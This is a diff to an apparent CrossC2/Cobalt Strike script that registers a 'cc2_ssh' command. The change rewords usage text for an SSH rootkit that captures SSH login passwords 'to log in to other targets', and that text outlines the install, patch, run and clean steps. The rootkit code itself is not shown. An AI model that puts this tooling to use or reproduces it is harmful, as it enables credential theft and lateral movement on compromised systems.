@@ -2,7 +2,7 @@
 include(script_resource("CrossC2Kit.cna"));
 
 sub printUsage_ssh {
-    blog($1, "\nUsage: cc2_ssh <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for ssh login.\n\tstep: \t<install>, <copy>, <patch>, <run>, <uninstall> <clean>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. patch: \tspecify the name of the dynamic library to patch.\n\tstep 3. run: \tstart running ssh rootkit.\n\tstep 4. uninstall: \tuninstall ssh rootkit.\n\tstep 5. clean: \tclean ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux patch libxxx.0.0.1.so\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n\tcc2_ssh linux clean libxxx.0.0.1.so\n");
+    blog($1, "\nUsage: cc2_ssh <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get the password of ssh to log in to other targets.\n\tstep: \t<install>, <copy>, <patch>, <run>, <uninstall> <clean>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. patch: \tspecify the name of the dynamic library to patch.\n\tstep 3. run: \tstart running ssh rootkit.\n\tstep 4. uninstall: \tuninstall ssh rootkit.\n\tstep 5. clean: \tclean ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux patch libxxx.0.0.1.so\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n\tcc2_ssh linux clean libxxx.0.0.1.so\n");
 }
 
 ssh_alias cc2_ssh {
@@ -82,4 +82,4 @@ ssh_alias cc2_ssh {
     }
 }
 
-ssh_command_register("cc2_ssh", "CrossC2 SSH rootkit - Get password for ssh login.", "\nUsage: cc2_ssh <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for ssh login.\n\tstep: \t<install>, <copy>, <patch>, <run>, <uninstall> <clean>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. patch: \tspecify the name of the dynamic library to patch.\n\tstep 3. run: \tstart running ssh rootkit.\n\tstep 4. uninstall: \tuninstall ssh rootkit.\n\tstep 5. clean: \tclean ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux patch libxxx.0.0.1.so\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n\tcc2_ssh linux clean libxxx.0.0.1.so\n");
+ssh_command_register("cc2_ssh", "CrossC2 SSH rootkit - Get the password of ssh to log in to other targets.", "\nUsage: cc2_ssh <linux(32)/osx> <step> (lib_name)\n\troot permissions\nssh rootkit: Get password for ssh login.\n\tstep: \t<install>, <copy>, <patch>, <run>, <uninstall> <clean>.\n\n\tstep 1. install: \tget a prepared dynamic library file `libxxx.0.0.1.so`.\n\tstep 2. patch: \tspecify the name of the dynamic library to patch.\n\tstep 3. run: \tstart running ssh rootkit.\n\tstep 4. uninstall: \tuninstall ssh rootkit.\n\tstep 5. clean: \tclean ssh rootkit.\nEx:\n\tcc2_ssh linux install\n\tcc2_ssh linux patch libxxx.0.0.1.so\n\tcc2_ssh linux run\n\tcc2_ssh linux uninstall libxxx.0.0.1.so\n\tcc2_ssh linux clean libxxx.0.0.1.so\n");
